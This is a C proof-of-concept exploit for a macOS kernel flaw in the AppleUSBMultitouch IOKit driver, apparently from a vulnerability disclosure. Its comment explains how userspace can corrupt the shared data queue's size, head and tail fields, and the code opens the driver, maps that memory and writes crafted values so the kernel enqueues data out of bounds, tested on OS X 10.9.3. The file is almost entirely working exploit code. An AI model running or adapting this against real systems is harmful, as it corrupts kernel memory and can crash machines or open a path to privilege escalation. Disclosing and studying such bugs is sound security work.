/*
clang -o new_poc_apple_usb_multitouch_enqueue new_poc_apple_usb_multitouch_enqueue.c -framework IOKit

The clientMemoryForType method of AppleUSBMultitouchUserClient creates an AppleMultitouchIODataQueue
and maps it into kernel/user shared memory. AppleMultitouchIODataQueue inherits from IODataQueue.

The memory which is mapped into userspace is represented by the variable-sized struct IODataQueueMemory:

typedef struct _IODataQueueMemory {
      UInt32 queueSize;
      volatile UInt32 head;
      volatile UInt32 tail;
      IODataQueueEntry queue[1];
} IODataQueueMemory;

Userspace can modify the queueSize, head and tail values such that the kernel will try to enqueue a value to the queue
outside of the allocated queue.

tested on: MacBookAir5,2 w/ 10.9.3/13d65
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <IOKit/IOKitLib.h>

int main(){
  kern_return_t err;

  CFMutableDictionaryRef matching = IOServiceMatching("AppleUSBMultitouchDriver");
  if(!matching){
    printf("unable to create service matching dictionary\n");
    return 0;
  }

  io_iterator_t iterator;
  err = IOServiceGetMatchingServices(kIOMasterPortDefault, matching, &iterator);
  if (err != KERN_SUCCESS){
    printf("no matches\n");
    return 0;
  }

  io_service_t service = IOIteratorNext(iterator);

  if (service == IO_OBJECT_NULL){
    printf("unable to find service\n");
    return 0;
  }
  printf("got service: %x\n", service);


  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
  if (err != KERN_SUCCESS){
    printf("unable to get user client connection\n");
    return 0;
  }else{
    printf("got userclient connection: %x, type:%d\n", conn, 0);
  }
  
  printf("got userclient connection: %x\n", conn);

  mach_vm_address_t addr = 0x4100000000;
  mach_vm_size_t size = 0x1000;
  uint32_t* buf = 0;

  err = IOConnectMapMemory(conn, 0, mach_task_self(), &addr, &size, 0);
  if (err != KERN_SUCCESS){
    printf("IOConnectMapMemory failed:0x%x\n", err);
    return 0;
  }

  buf = (uint32_t*)addr;
  printf("mapped at: 0x%p size:0x%x\n", addr, size);
  
  buf[0] = 0xffff0000; // queueSize
  buf[1] = 0x40404040; // head
  buf[2] = 0x50505050; // tail
  printf("waiting for the kernel to enqueue ...\n");
  volatile int i = 0;
  for(;;){
    i++;
  }

  return 0;
}
